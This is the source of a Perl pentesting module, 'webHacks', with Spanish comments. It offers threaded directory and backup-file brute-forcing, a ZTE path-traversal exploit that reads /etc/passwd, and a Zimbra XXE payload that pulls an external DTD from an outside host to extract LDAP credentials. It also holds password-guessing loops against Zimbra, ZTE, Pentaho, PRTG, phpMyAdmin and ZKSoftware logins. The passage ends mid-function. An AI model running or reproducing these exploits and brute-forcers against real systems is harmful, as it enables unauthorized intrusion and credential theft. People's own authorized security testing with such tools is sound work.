#module-starter --module=webHacks --author="Daniel Torres" --email=daniel.torres@owasp.org
# May 27 2017
# web Hacks
package webHacks;
our $VERSION = '1.0';
use Moose;
use Text::Table;
use Data::Dumper;
use LWP::UserAgent;
use HTTP::Cookies;
use URI::Escape;
use HTTP::Request;
use HTTP::Response;
use HTML::Scrubber;
use Switch;
#use Encode;
use Parallel::ForkManager;
#use Net::SSL (); # From Crypt-SSLeay
use Term::ANSIColor;
use utf8;
use Text::Unidecode;
binmode STDOUT, ":encoding(UTF-8)";


no warnings 'uninitialized';

#$Net::HTTPS::SSL_SOCKET_CLASS = "Net::SSL"; # Force use of Net::SSL for proxy compatibility

{
has 'rhost', is => 'rw', isa => 'Str',default => '';	
has 'rport', is => 'rw', isa => 'Str',default => '80';	
has 'path', is => 'rw', isa => 'Str',default => '/';	
has 'ssl', is => 'rw', isa => 'Str',default => '';	
has 'max_redirect', is => 'rw', isa => 'Int',default => 0;	
has 'html', is => 'rw', isa => 'Str',default => '';	
has 'final_url', is => 'rw', isa => 'URI';	

has user_agent      => ( isa => 'Str', is => 'rw', default => '' );
has proxy_host      => ( isa => 'Str', is => 'rw', default => '' );
has proxy_port      => ( isa => 'Str', is => 'rw', default => '' );
has proxy_user      => ( isa => 'Str', is => 'rw', default => '' );
has proxy_pass      => ( isa => 'Str', is => 'rw', default => '' );
has proxy_env      => ( isa => 'Str', is => 'rw', default => '' );
has error404      => ( isa => 'Str', is => 'rw', default => '' );
has cookie      => ( isa => 'Str', is => 'rw', default => '' );
has ajax      => ( isa => 'Str', is => 'rw', default => '0' );
has threads      => ( isa => 'Int', is => 'rw', default => 10 );
has debug      => ( isa => 'Int', is => 'rw', default => 0 );
has mostrarTodo      => ( isa => 'Int', is => 'rw', default => 1 );
has headers  => ( isa => 'Object', is => 'rw', lazy => 1, builder => '_build_headers' );
has browser  => ( isa => 'Object', is => 'rw', lazy => 1, builder => '_build_browser' );

########### scan directories #######       
sub dirbuster
{
my $self = shift;
my $headers = $self->headers;
my $debug = $self->debug;
my $mostrarTodo = $self->mostrarTodo;
my $rhost = $self->rhost;
my $rport = $self->rport;
my $path = $self->path;
my $error404 = $self->error404;
my $threads = $self->threads;
my $ssl = $self->ssl;
my ($url_file,$extension) = @_;

my $cookie = $self->cookie;

if ($cookie ne "")
	{$headers->header("Cookie" => $cookie);} 

my $ajax = $self->ajax;

if ($ajax ne "0")
	{$headers->header("x-requested-with" => "xmlhttprequest");}

# Max parallel processes  
my $pm = new Parallel::ForkManager($threads); 
my @links;

########### file to array (url_file) #######
open (MYINPUT,"<$url_file") || die "ERROR: Can not open the file $url_file\n";
while (my $url=<MYINPUT>)
{ 
$url =~ s/\n//g; 	
push @links, $url;
}
close MYINPUT;
#########################################


print "ssl in dirbuster $ssl \n" if ($debug);

my $lines = `wc -l $url_file | cut -d " " -f1`;
$lines =~ s/\n//g;
my $time = int($lines/600);

print color('bold blue');
print "######### Usando archivo: $url_file ";

if ($extension ne "")
	{print "con extension: $extension ##################### \n";}
else
	{print "##################### \n";}

print "Configuracion : Hilos: $threads \t SSL:$ssl \t Ajax: $ajax \t Cookie: $cookie mostrarTodo $mostrarTodo\n";
print "Tiempo estimado en probar $lines URLs : $time minutos\n\n";
print color('reset');

my $result_table = Text::Table->new(
        "STATUS", "  URL", "\t\t\t\t RISKY METHODS"
);
    
print $result_table;

foreach my $file (@links) {
    $pm->start and next; # do the fork   
    $file =~ s/\n//g; 	
	#Adicionar backslash
	#if (! ($file =~ /\./m)){	 
	if ($url_file =~ "directorios"){	 
		$file = $file."/";
	}
	
	switch ($extension) {
	case "php"	{ $file =~ s/EXT/php/g;  }	
	case "html"	{ $file =~ s/EXT/html/g;  }
	case "asp"	{ $file =~ s/EXT/asp/g;  }
	case "aspx"	{ $file =~ s/EXT/aspx/g;  }
	case "htm"	{ $file =~ s/EXT/htm/g;  }
	case "jsp"	{ $file =~ s/EXT/jsp/g;  }
    }

	my $url;
	if ($ssl)
		{$url = "https://".$rhost.":".$rport.$path.$file;}
	else
		{$url = "http://".$rhost.":".$rport.$path.$file;}   
        
	#print "getting $url \n";
	
	
	##############  thread ##############
	my $response = $self->dispatch(url => $url,method => 'GET',headers => $headers);
	my $status = $response->status_line;
	#print " pinche status $status \n";
	my $decoded_content = $response->decoded_content;
		 
	if ($error404 ne '')		
		{			
			if($decoded_content =~ /$error404/m){	
				$status="404"; 
			}
		}
	
	# check body and headers
	my $vuln=" ";
	if ($decoded_content eq ""){	 
		$vuln = " (Archivo vacio)\t";
	}
	
	if ($decoded_content =~ / RAT |C99Shell|b374k| r57 | wso | pouya | Kacak | jsp file browser |vonloesch.de|Upload your file|Cannot execute a blank command|fileupload in/i){	 
		$vuln = " (Posible Backdoor)\t";
	}	

	
	if($url =~ /r=usuario/m){	 
		if ($decoded_content =~ /r=usuario\/create/i)
			{$vuln = " (Exposición de usuarios/passwords)\t";}	
		else
			{$status="404";}
	}
	
	
	# Warning: mktime() expects parameter 6 to be long, string given in C:\inetpub\vhosts\mnhn.gob.bo\httpdocs\scripts\fecha.ph
	# Fatal error: Uncaught exception 'Symfony\Component\Routing\Exception\ResourceNotFoundException'
	if($decoded_content =~ /undefined function|Fatal error|Uncaught exception|No such file or directory|Lost connection to MySQL|mysql_select_db|ERROR DE CONSULTA|no se pudo conectar al servidor|Fatal error:|Uncaught Error:|Stack trace|Exception information/i)
		{$vuln = " (Mensaje de error)\t";} 		 
		
		
	if($decoded_content =~ /Access denied for/i)
	{
		#Access denied for user 'acanqui'@'192.168.4.20' 
		$decoded_content =~ /Access denied for user (.*?)\(/;
		my $usuario_ip = $1; 
		$vuln = " (Exposicion de usuario - $usuario_ip)\t";
	 } 	
		
	if($decoded_content =~ /Directory of|Index of|Parent directory/i)
		{$vuln = " (Listado directorio activo)\t";} 
	
	if($decoded_content =~ /HTTP_X_FORWARDED_HOST|SCRIPT_FILENAME/i)
		{$vuln = " (phpinfo)\t";} 
		
	my $content_length = $response->content_length;
	#print "content_length $content_length \n";
	#print " pinche status2 $status \n";

	
	if($status !~ /404|303|301|400/m){		
		my @status_array = split(" ",$status);	
		my $current_status = $status_array[0];
		my $response2 = $self->dispatch(url => $url,method => 'OPTIONS',headers => $headers);
		my $options = " ";
		$options = $response2->{_headers}->{allow};	
		$options =~ s/GET|HEAD|POST|OPTIONS//g; # delete safe methods	
		$options =~ s/,,//g; # delete safe methods	
		
		if(($status =~ /302/m) && ($content_length > 500) ){	 
			$vuln = " (HTML en redirect)\t";
		}
 
		# Revisar si el registro de usuario drupal/joomla/wordpress esta abierto
		if ($url_file =~ "registroHabilitado"){	 		
			if($decoded_content =~ /\/user\/register|registerform|member-registration/m){		
				print "$current_status\t$url$vuln $options \n";
			}
		}
		else
		{		
			print "$current_status\t$url$vuln $options \n";
		}		
		
		#$result_table->add($url,$status,$options);			
	}
	else
	{
		print "$status\t$url$vuln  \n" if ($mostrarTodo);
	}
	
	#if($status =~ /302|301/m){		
		
		#my $response_headers = $response->headers_as_string;
		#my ($location) = ($response_headers =~ /Location:(.*?)\n/i);
		#print "location $location \n" if ($debug);

		#if ( length($location) > 10 )
			#{print "$status\t$url;$location\n";}		
		
		#$result_table->add($url,$status,$options);			
	#}
	##############	
   $pm->finish; # do the exit in the child process
  
  }
  $pm->wait_all_children;

}


#search for directories like   192.168.0.1/~username
sub userbuster
{
my $self = shift;
my $headers = $self->headers;
my $debug = $self->debug;
my $mostrarTodo = $self->mostrarTodo;
my $rhost = $self->rhost;
my $rport = $self->rport;
my $path = $self->path;
my $ssl = $self->ssl;
my $error404 = $self->error404;
my $threads = $self->threads;
my ($url_file) = @_;


my $cookie = $self->cookie;

if ($cookie ne "")
	{$headers->header("Cookie" => $cookie);} 

my $ajax = $self->ajax;

if ($ajax ne "0")
	{$headers->header("x-requested-with" => "xmlhttprequest");}

# Max parallel processes  
my $pm = new Parallel::ForkManager($threads); 
my @links;

########### file to array (url_file) #######
open (MYINPUT,"<$url_file") || die "ERROR: Can not open the file $url_file\n";
while (my $url=<MYINPUT>)
{ 
$url =~ s/\n//g; 	
push @links, $url;
}
close MYINPUT;
#########################################


my $lines = `wc -l $url_file | cut -d " " -f1`;
$lines =~ s/\n//g;
my $time = int($lines/600);

print color('bold blue');
print "######### Usando archivo: $url_file ##################### \n";
print "Configuracion : Hilos: $threads \t SSL:$ssl \t Ajax: $ajax \t Cookie: $cookie\n";
print "Tiempo estimado en probar $lines URLs : $time minutos\n\n";
print color('reset');

my $result_table = Text::Table->new(
        "STATUS", "  URL", "\t\t\t\t RISKY METHODS"
);
    
print $result_table;    

foreach my $file (@links) {
    $pm->start and next; # do the fork   
    $file =~ s/\n//g; 	

	my $url;
	if ($ssl)
		{$url = "https://".$rhost.":".$rport.$path."~".$file."/";}
	else
		{$url = "http://".$rhost.":".$rport.$path."~".$file."/";}  
        
	#print "getting $url \n";
	##############  thread ##############
	my $response = $self->dispatch(url => $url,method => 'GET',headers => $headers);
	my $status = $response->status_line;
	my $decoded_content = $response->decoded_content;
		 
	if ($error404 ne '')		
		{			
			if($decoded_content =~ /$error404/m){	
				$status="404"; 
			}
		}
		
	if($status !~ /404|500|302|303|301|503|400/m){		
		my @status_array = split(" ",$status);	
		my $current_status = $status_array[0];
		my $response2 = $self->dispatch(url => $url,method => 'OPTIONS',headers => $headers);
		my $options = " ";
		$options = $response2->{_headers}->{allow};	
		$options =~ s/GET|HEAD|POST|OPTIONS//g; # delete safe methods	
		$options =~ s/,,//g; # delete safe methods	
		print "$current_status\t$url\t$options \n";
		#$result_table->add($url,$status,$options);			
	}
	##############	
   $pm->finish; # do the exit in the child process
  }
  $pm->wait_all_children;   
}


#search for backupfiles
sub backupbuster
{
my $self = shift;
my $headers = $self->headers;
my $debug = $self->debug;
my $mostrarTodo = $self->mostrarTodo;
my $rhost = $self->rhost;
my $rport = $self->rport;
my $path = $self->path;
my $ssl = $self->ssl;
my $error404 = $self->error404;
my $threads = $self->threads;
my ($url_file) = @_;


my $cookie = $self->cookie;

if ($cookie ne "")
	{$headers->header("Cookie" => $cookie);} 

my $ajax = $self->ajax;

if ($ajax ne "0")
	{$headers->header("x-requested-with" => "xmlhttprequest");}

# Max parallel processes  
my $pm = new Parallel::ForkManager($threads); 
my @links;

########### file to array (url_file) #######
open (MYINPUT,"<$url_file") || die "ERROR: Can not open the file $url_file\n";
while (my $url=<MYINPUT>)
{ 
$url =~ s/\n//g; 	
push @links, $url;
}
close MYINPUT;
#########################################

my $lines = `wc -l $url_file | cut -d " " -f1`;
$lines =~ s/\n//g;
my $time = int($lines/60);

print color('bold blue');
print "######### Usando archivo: $url_file ##################### \n";
print "Configuracion : Hilos: $threads \t SSL:$ssl \t Ajax: $ajax \t Cookie: $cookie\n";
print "Tiempo estimado en probar $lines archivos de backup : $time minutos\n\n";
print color('reset');

    
my $result_table = Text::Table->new(
        "STATUS", "  URL", "\t\t\t\t RISKY METHODS"
);

print $result_table;

foreach my $file (@links) 
{
	
	my @backups = (".FILE.EXT.swp","FILE.inc","FILE~","FILE.bak","FILE.tmp","FILE.temp","FILE.old","FILE.bakup","FILE-bak", "FILE~", "FILE.save", "FILE.swp", "FILE.old","Copy of FILE","FILE (copia 1)","FILE::\$DATA");
	$file =~ s/\n//g; 	
	#print "file $file \n";
	my $url;

	foreach my $backup_file (@backups) {			
		$backup_file =~ s/FILE/$file/g;    		
		
		if ($ssl)
			{$url = "https://".$rhost.":".$rport.$path.$backup_file;}
		else
			{$url = "http://".$rhost.":".$rport.$path.$backup_file;}
				    
		$pm->start and next; # do the fork 
		#print  "$url \n"; 
		my $response = $self->dispatch(url => $url,method => 'GET',headers => $headers);
		my $status = $response->status_line;
		my $decoded_content = $response->decoded_content;
		 
		if ($error404 ne '')		
		{			
			if($decoded_content =~ /$error404/m){	
				$status="404"; 
			}
		}
		
		my @status_array = split(" ",$status);	
		my $current_status = $status_array[0];
		
		#if($status !~ /404|503|400/m){	
		if($status !~ /404|500|302|303|301|503|400/m)
			{print "$current_status\t$url\n";}
		else
			{print "$status\t$url  \n" if ($mostrarTodo);}		
		$pm->finish; # do the exit in the child process		   
	}# end foreach backupname
	$pm->wait_all_children; 
} # end foreach file
}


sub openrelay
{
my $self = shift;
my $headers = $self->headers;
my $debug = $self->debug;

my %options = @_;
my $ip = $options{ ip };
my $port = $options{ port };
my $correo = $options{ correo };


$headers->header("Content-Type" => "application/x-www-form-urlencoded");
$headers->header("Cookie" => "ZM_TEST=true");
$headers->header("Referer" => "http://www.dnsexit.com/Direct.sv?cmd=testMailServer");
$headers->header("Accept" => "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");				
		

my $hash_data = {'actioncode' => 1, 
				'from' => $correo,
				'to' => $correo,
				'emailserver' => $ip,
				'port' => $port,
				'Submit' => "Check+Email+Server",
				
				};		
	my $post_data = convert_hash($hash_data);
		
	my $response = $self->dispatch(url => "http://www.dnsexit.com/Direct.sv?cmd=testMailServer",method => 'POST', post_data =>$post_data ,headers => $headers);
	my $decoded_response = $response->decoded_content;
	#$decoded_response =~ /<textarea name=(.*?\n\r\t)<\/textarea>/;
	#my $result = $1; 
	print "$decoded_response \n";
	#print "$decoded_response \n";

}



sub exploit
{
my $self = shift;
my $headers = $self->headers;
my $debug = $self->debug;
my $rhost = $self->rhost;
my $rport = $self->rport;
my $ssl = $self->ssl;


my %options = @_;
my $module = $options{ module };
my $path = $options{ path };


print color('bold blue') if($debug);
print "######### Testendo: $module ##################### \n\n" if($debug);
print color('reset') if($debug);

my $url;
if ($ssl)
  {$url = "https://".$rhost.":".$rport.$path;}
else
  {$url = "http://".$rhost.":".$rport.$path;}


  
if ($module eq "zte")
{
	my $response = $self->dispatch(url => $url."../../../../../../../../../../../../etc/passwd",method => 'GET', headers => $headers);
	my $decoded_response = $response->decoded_content;
	print "$decoded_response \n";
}

if ($module eq "zimbraXXE")
{
	
	my $xml= "<!DOCTYPE Autodiscover [
        <!ENTITY % dtd SYSTEM 'https://hackworld1.github.io/zimbraUser.dtd'>
        %dtd;
        %all;
        ]>
	<Autodiscover xmlns='http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a'>
    <Request>
        <EMailAddress>aaaaa</EMailAddress>
        <AcceptableResponseSchema>&fileContents;</AcceptableResponseSchema>
    </Request>
	</Autodiscover>";

	my $response = $self->dispatch(url => $url."Autodiscover/Autodiscover.xml",method => 'POST_FILE',post_data =>$xml,  headers => $headers);
	my $decoded_response = $response->decoded_content;
	
	$decoded_response =~ s/&gt;/>/g; 
	$decoded_response =~ s/&lt;/</g; 
	
	print "$decoded_response \n";
	
	if($decoded_response =~ /ldap_root_password/m){	 		
		$decoded_response =~ /name="zimbra_user">\n    <value>(.*?)</;
		my $username = $1; 
	
		$decoded_response =~ /name="zimbra_ldap_password">\n    <value>(.*?)</;
		my $password = $1; 
			
		print "Credenciales: Usuario: $username password: $password\n";
	}
}

}


sub passwordTest
{
my $self = shift;
my $headers = $self->headers;
my $debug = $self->debug;
my $rhost = $self->rhost;
my $rport = $self->rport;
my $ssl = $self->ssl;

my %options = @_;
my $module = $options{ module };
my $passwords_file = $options{ passwords_file };
my $user = $options{ user };
my $path = $options{ path };




print color('bold blue') if($debug);
print "######### Testendo: $module ##################### \n\n" if($debug);
print color('reset') if($debug);


my $url;
if ($ssl)
  {$url = "https://".$rhost.":".$rport.$path;}
else
  {$url = "http://".$rhost.":".$rport.$path;}

if ($module eq "ZKSoftware")
{
		
	open (MYINPUT,"<$passwords_file") || die "ERROR: Can not open the file $passwords_file\n";	
	while (my $password=<MYINPUT>)
	{ 
		$password =~ s/\n//g; 	
		my $hash_data = {'username' => $user, 
				'userpwd' => $password
				};	
	
		my $post_data = convert_hash($hash_data);
		
		my $response = $self->dispatch(url => $url."/csl/check",method => 'POST',post_data =>$post_data, headers => $headers);
		my $decoded_response = $response->decoded_content;
		my $status = $response->status_line;
		
		print "[+] user:$user password:$password status:$status\n";
		if ($status =~ /200/m)
		{
			if  ($decoded_response =~ /Department|Departamento|frame/i){	 
			print "Password encontrado: [ZKSoftware] $url \nUsuario:$user Password:$password\n";
			last;
			}							
		}	
		
	}
	close MYINPUT;	
}#ZKSoftware


if ($module eq "zimbra")
{
	my $counter = 1;	
	open (MYINPUT,"<$passwords_file") || die "ERROR: Can not open the file $passwords_file\n";	
	while (my $password=<MYINPUT>)
	{ 
		$password =~ s/\n//g; 	
		my $hash_data = {"loginOp" => "login",
						 "client" => "preferred",
						'username' => $user, 
						'password' => $password
				};	
	
		my $post_data = convert_hash($hash_data);
		
		$headers->header("Content-Type" => "application/x-www-form-urlencoded");
		$headers->header("Cookie" => "ZM_TEST=true");
		$headers->header("Accept" => "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");				
		
		my $response = $self->dispatch(url => $url,method => 'POST',post_data =>$post_data, headers => $headers);
		my $decoded_response = $response->decoded_content;
		my $status = $response->status_line;
		
		if ($decoded_response =~ /error en el servicio de red|network service error/i)
		{				 
			print "El servidor Zimbra esta bloqueando nuestra IP :( \n";
			last;
										
		}	
		
		
		print "[+] user:$user password:$password status:$status\n";
		if ($status =~ /302/m)
		{				 
			print "Password encontrado: [zimbra] $url (Usuario:$user Password:$password)";
			last;
										
		}
		
		#if (0 == $counter % 10) {
			#print "Sí es múltiplo de 10\n";
			#sleep 120;
		#}			
		$counter = $counter + 1;
		#sleep 1;
	}
	close MYINPUT;	
}#zimbra

#ZTE
if ($module eq "zte")
{
			
	open (MYINPUT,"<$passwords_file") || die "ERROR: Can not open the file $passwords_file\n";	
	while (my $password=<MYINPUT>)
	{ 
	
		$headers->header("Content-Type" => "application/x-www-form-urlencoded");
		$headers->header("Accept" => "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");		
		$headers->header("Cookie" => "_TESTCOOKIESUPPORT=1");		
		
		my $response = $self->dispatch(url => $url,method => 'GET', headers => $headers);
		my $decoded_response = $response->decoded_content;
		$decoded_response =~ s/"//g; 
		$decoded_response =~ s/\)//g; 
		my $status = $response->status_line;
	

		#getObj(Frm_Logintoken.value = 8;;
		$decoded_response =~ /Frm_Logintoken.value = (.*?);/;
		my $Frm_Logintoken = $1; 
				
		
		$password =~ s/\n//g; 	
		my $hash_data = {"frashnum" => "",
						 "action" => "login",
						 "Frm_Logintoken" => $Frm_Logintoken,
						'Username' => $user, 
						'Password' => $password
				};	
	

		my $post_data = convert_hash($hash_data);
		
		$response = $self->dispatch(url => $url,method => 'POST',post_data =>$post_data, headers => $headers);
		$decoded_response = $response->decoded_content;
		$status = $response->status_line;
		
		print "[+] user:$user password:$password status:$status\n";
		if ($status =~ /302/m)
		{				 
			print "Password encontrado: [ZTE] $url (Usuario:$user Password:$password)\n";
			last;
										
		}	
		
	}
	close MYINPUT;	
}

# pentaho
if ($module eq "pentaho")
{
			
	open (MYINPUT,"<$passwords_file") || die "ERROR: Can not open the file $passwords_file\n";	
	while (my $password=<MYINPUT>)
	{ 
		$password =~ s/\n//g; 
		$headers->header("Content-Type" => "application/x-www-form-urlencoded; charset=UTF-8");
		$headers->header("Accept" => "text/plain, */*; q=0.01");		
		$headers->header("X-Requested-With" => "XMLHttpRequest");		
						
		my $hash_data = {"locale" => "en_US",						 
						'j_username' => $user, 
						'j_password' => $password
				};	
	

		my $post_data = convert_hash($hash_data);
		     	   
		my $response = $self->dispatch(url => $url."pentaho/j_spring_security_check",method => 'POST',post_data =>$post_data, headers => $headers);
		my $response_headers = $response->headers_as_string;
		my $decoded_response = $response->decoded_content;
		my $status = $response->status_line;
		
		print "[+] user:$user password:$password status:$status\n";
		#Location: /pentaho/Home (password OK)		#Location: /pentaho/Login?login_error=1 (password BAD)
		if ($response_headers =~ /Home/i)
		{				 
			print "Password encontrado: [Pentaho] $url (Usuario:$user Password:$password)\n";
			last;
										
		}	
		
	}
	close MYINPUT;	
}

if ($module eq "PRTG")
{

	$headers->header("Content-Type" => "application/x-www-form-urlencoded");		
	open (MYINPUT,"<$passwords_file") || die "ERROR: Can not open the file $passwords_file\n";	
	while (my $password=<MYINPUT>)
	{ 
		$password =~ s/\n//g; 	
		my $hash_data = {'username' => $user, 
				'password' => $password,
				'guiselect' => "radio"
				};	
	
		my $post_data = convert_hash($hash_data);
		
		my $response = $self->dispatch(url => $url."/public/checklogin.htm",method => 'POST',post_data =>$post_data, headers => $headers);
		my $decoded_response = $response->decoded_content;
		my $response_headers = $response->headers_as_string;
		my $status = $response->status_line;
		
		print "[+] user:$user password:$password status:$status\n";
		
		
		if (!($response_headers =~ /error/m) && ! ($status =~ /500 read timeout/m)){	 
			print "Password encontrado: [PRTG] $url \nUsuario:$user Password:$password\n";
			last;
		}
		
	}
	close MYINPUT;	
}#PRTG


if ($module eq "phpmyadmin")
{
		
	open (MYINPUT,"<$passwords_file") || die "ERROR: Can not open the file $passwords_file\n";	
	while (my $password=<MYINPUT>)
	{ 
		
		$password =~ s/\n//g; 	
		my $response = $self->dispatch(url => $url,method => 'GET', headers => $headers);
		my $decoded_response = $response->decoded_content;
				
		#open (SALIDA,">phpmyadmin.html") || die "ERROR: No puedo abrir el fichero google.html\n";
		#print SALIDA $decoded_response;
		#close (SALIDA);

		if ($decoded_response =~ /navigation.php\?token|navigation.php\?lang/i &&  $decoded_response =~ /main.php\?token|main.php\?lang=/i)
		{			
			print "Password encontrado: [phpmyadmin] $url (Sistema sin password)\n";
			last;									
		}	 
		
		#name="token" value="3e011556a591f8b68267fada258b6d5a"
		$decoded_response =~ /name="token" value="(.*?)"/;
		my $token = $1;



		if ($decoded_response =~ /respondiendo|not responding|<h1>Error<\/h1>/i)
		{			
			print "ERROR: El servidor no está respondiendo \n";
			last;									
		}	 

		
		#pma_username=dgdf&pma_password=vhhg&server=1&target=index.php&token=918ab63463cf3b565d0073973b84f21c
		my $hash_data = {'pma_username' => $user, 
				'pma_password' => $password,
				'token' => $token,
				'target' => "index.php",
				'server' => "1",
				};	
	
		my $post_data = convert_hash($hash_data);
		GET:		
		$headers->header("Content-Type" => "application/x-www-form-urlencoded");
		$response = $self->dispatch(url => $url."index.php",method => 'POST',post_data =>$post_data, headers => $headers);
		$decoded_response = $response->decoded_content;	
		my $status = $response->status_line;	
		my $response_headers = $response->headers_as_string;
		
		#Refresh: 0; http://181.188.172.2/phpmyadmin/index.php?token=dd92af52b6eeefd014f7254ca02b0c25
		 
		
		if ($status =~ /500/m)
			{goto GET;}
			
		if ($status =~/30/m || $response_headers =~/Refresh: /m)
		{
			#Location: http://172.16.233.136/phpMyAdmin2/index.php?token=17d5777095918f70cf052a1cd769d985
			$response_headers =~ /Location:(.*?)\n/;
			my $new_url = $1; 	
			if ($new_url eq ''){
				$response_headers =~ /Refresh: 0; (.*?)\n/;
				$new_url = $1;
			}
			
			#print "new_url $new_url \n";
		
			$response = $self->dispatch(url => $new_url, method => 'GET');
			$decoded_response = $response->decoded_content;								
			#open (SALIDA,">phpmyadmin2.html") || die "ERROR: No puedo abrir el fichero google.html\n";
			#print SALIDA $decoded_response;
			#close (SALIDA);
		}
		
		print "[+] user:$user password:$password status:$status\n";
	    
		#open (SALIDA,">phpmyadminn.html") || die "ERROR: No puedo abrir el fichero google.html\n";
		#print SALIDA $decoded_response;
		#close (SALIDA);
			
					
		if (!($decoded_response =~ /pma_username/m) && !($decoded_response =~ /Cannot log in to the MySQL server|1045 El servidor MySQL/i))
		{			
			print "Password encontrado: [phpmyadmin] $url \nUsuario:$user Password:$password\n";
			last;									
		}	
		
	}
	close MYINPUT;	
}#phpmyadmin


}



sub getData
{
my $self = shift;
my $headers = $self->headers;
my $debug = $self->debug;
my $rhost = $self->rhost;
my $rport = $self->rport;
my $ssl = $self->ssl;
my $path = $self->path;

my $type=""; #Aqui se guarda que tipo de app es taiga/express/camara,etc
my %options = @_;
my $log_file = $options{ log_file };

$headers->header("Accept-Encoding" => "gzip, deflate");

my $url;
if ($ssl)
  {
	  if ($rport eq '443')
		{$url = "https://".$rhost.$path;}
	  else
		{$url = "https://".$rhost.":".$rport.$path;}
	  
  }
else
  {
	if ($rport eq '80')
	  {$url = "http://".$rhost.$path;}
	else
	  {$url = "http://".$rhost.":".$rport.$path;}
  }


my $response = $self->dispatch(url => $url."nonexistroute123", method => 'GET', headers => $headers);
my $decoded_response = $response->decoded_content;
my $status = $response->status_line;


if($decoded_response =~ /error message|Django|APP_ENV|DEBUG = True|app\/controllers/i){	 
	$type=$type."|Debug habilitado";
}
elsif($status =~ /200/m)
{
	$type=$type."|NodeJS";
} 
$response = $self->dispatch(url => $url, method => 'GET', headers => $headers);
$status = $response->status_line;
my $last_url = $response->request()->uri();
print "url $url last_url $last_url \n" if ($debug);

#Peticion original  https://186.121.202.25/
my @url_array1 = split("/",$url);
my $protocolo1 = $url_array1[0];

#Peticion 2 (si fue redireccionada)
my @url_array2 = split("/",$last_url);
my $protocolo2 = $url_array2[0];


if ($protocolo1 ne $protocolo2)
	{$type=$type."|HTTPSredirect";}  # hubo redireccion http --> https 


my $url_original = URI->new($url);
my $domain_original = $url_original->host;

my $url_final = URI->new($last_url);
my $domain_final = $url_final->host;

print "domain_original $domain_original domain_final $domain_final \n" if ($debug);

if ($domain_original ne $domain_final)
	{$type=$type."|301 Moved";}  # hubo redireccion http://dominio.com --> http://www.dominio.com
		
$decoded_response = $response->decoded_content;
$decoded_response =~ s/'/"/g; # convertir comilla simple en comilla doble

	
### get redirect url ###
REDIRECT:
$decoded_response =~ s/; url=/;url=/gi; 
$decoded_response =~ s/\{//gi; 
#$decoded_response =~ s/^.*?\/noscript//s;  #delete everything before xxxxxxxxx
$decoded_response =~ s/<noscript[^\/noscript>]*\/noscript>//g;


#<meta http-equiv="Refresh" content="0;URL=/page.cgi?page=status">
$decoded_response =~ /meta http-equiv="Refresh" content="0;URL=(.*?)"/i;
my $redirect_url = $1; 



if ($redirect_url eq '')
{
	                    #<script>window.onload=function(){ url ="/webui";window.location.href=url;}</script>
	$decoded_response =~ /window.onload=function\(\) url ="(.*?)"/i;
	$redirect_url = $1; 
}

if ($redirect_url eq '')
{
	                    #<meta http-equiv="Refresh" content="1;url=http://facturas.tigomoney.com.bo/tigoMoney/">	
	$decoded_response =~ /meta http-equiv="Refresh" content="1;URL=(.*?)"/i;
	$redirect_url = $1; 
}


if ($redirect_url eq '')
{
	#<META http-equiv="Refresh" content="0;url=http://www.infocred.com.bo/BICWebSite"> 
	
	$decoded_response =~ /meta http-equiv="Refresh" content="0;URL=(.*?)"/i;
	$redirect_url = $1; 
}


if ($redirect_url eq '')
{
	#window.location="http://www.cadeco.org/cam";</script>	

	$decoded_response =~ /window.location="(.*?)"/i;
	$redirect_url = $1; 
}

if ($redirect_url eq '')
{
	#window.location.href="login.html?ver="+fileVer;	
	$decoded_response =~ /window.location.href="(.*?)"/i;
	$redirect_url = $1; 
}

if ($redirect_url eq '')
{
	#window.location.href = "/doc/page/login.asp?_" 	
	$decoded_response =~ /window.location.href = "(.*?)"/i;
	$redirect_url = $1; 	
}


if ($redirect_url eq '')
{
	#window.location = "http://backupagenda.vivagsm.com/pdm-login-web-nuevatel-bolivia/signin/"

	$decoded_response =~ /window.location = "(.*?)"/i;
	$redirect_url = $1; 
}

if ($redirect_url eq '')
{
	#top.location="/login";

	$decoded_response =~ /top.location="(.*?)"/i;
	$redirect_url = $1; 
}

if ($redirect_url eq '')
{	
  #<html><script>document.location.replace("/+CSCOE+/logon.html")</script></html>

	$decoded_response =~ /location.replace\("(.*?)"/;
	$redirect_url = $1;	
}

if ($redirect_url eq '')
{	
  #jumpUrl = "/cgi-bin/login.html";
	$decoded_response =~ /jumpUrl = "(.*?)"/;
	$redirect_url = $1;	
}

if ($redirect_url eq '')
{	
  #top.document.location.href = "/index.html";
	$decoded_response =~ /top.document.location.href = "(.*?)"/;
	$redirect_url = $1;	
}

if ($redirect_url eq '')
{	
  #<meta http-equiv="refresh" content="0.1;url=808gps/login.html"/>  
	$decoded_response =~ /http-equiv="refresh" content="0.1;url=(.*?)"/;
	$redirect_url = $1;	
}


# si la ruta de la redireccion no esta completa borrarla
if (($redirect_url eq 'https:' ) || ($redirect_url eq 'http:'))
	{$redirect_url=""}


##### GO TO REDIRECT URL ####
$redirect_url =~ s/\"//g;  
print "redirect_url $redirect_url \n" if ($debug);

# webfig (mikrotik) ..\/ (OWA) no usar redireccion
if($redirect_url =~ /webfig|\.\.\//m ){
	$redirect_url="";
	print "mikrotik/OWA detectado \n" if ($debug);
}
# ruta completa http://10.0.0.1/owa
if($redirect_url =~ /http/m ){	 
	$response = $self->dispatch(url => $redirect_url, method => 'GET', headers => $headers);
	$decoded_response = $response->decoded_content; 	 
 }  
#ruta parcial /cgi-bin/login.htm
#si no hay redireccion o la URL de rediccion es incorrecta
elsif ( $redirect_url ne ''  )
{	
	my $final_url;
	my $firstChar = substr($redirect_url, 0, 1);
	print "firstChar $firstChar \n" if ($debug);
	chop($url); #delete / char
	print "url $url \n" if ($debug);
	if ($firstChar eq "/")
		{$final_url = $url.$redirect_url;}
	else
		{$final_url = $url."/".$redirect_url;}

	
	print "final_url $final_url \n" if ($debug);
	$response = $self->dispatch(url => $final_url, method => 'GET', headers => $headers);
	$decoded_response = $response->decoded_content; 	
	
	 if($decoded_response =~ /meta http-equiv="refresh"/m){	 
		 $url = $final_url;
		 $url =~ s/index.php|index.asp//g;  
		 goto REDIRECT;
	 }	
	 
}
############################

	

my $response_headers = $response->headers_as_string;
my $final_url = $response->request->uri;
print "final_url $final_url \n" if ($debug);
$self->final_url($final_url);

$decoded_response = $response_headers."\n".$decoded_response;
$decoded_response =~ s/'/"/g; 

open (SALIDA,">$log_file") || die "ERROR: No puedo abrir el fichero $log_file\n";
print SALIDA $decoded_response;
close (SALIDA);


